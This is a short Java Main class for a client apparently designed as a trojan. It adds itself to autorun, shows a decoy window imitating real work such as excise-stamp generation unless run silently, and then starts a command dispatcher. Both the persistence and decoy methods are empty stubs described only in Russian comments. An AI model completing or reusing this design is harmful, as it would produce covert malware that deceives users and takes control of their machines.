package ru.prankleo.client;

import ru.prankleo.client.dispatcher.CommandDispatcher;
import ru.prankleo.client.settings.ArgParser;
import ru.prankleo.client.settings.Settings;

public class Main {

    public static void main(String[] args) {
        putSelfToAutoRunIfNeeded();

        Settings settings = ArgParser.getInstance().parseSettings(args);
        if(!settings.isInSilentMode()) {
            emulateRealWork();
        }

        CommandDispatcher.getInstance().start();
    }

    /**
     * Запустить имитацию нужной программы
     * TODO: Например, вывести окно имитирующее важные преобразования, типа генерации акцизных марок
     */
    private static void emulateRealWork() {

    }

    /**
     * Подложить скрипт запуска самого себя в автозапуск, если ранее еще не был подложен
     */
    private static void putSelfToAutoRunIfNeeded() {

    }
}
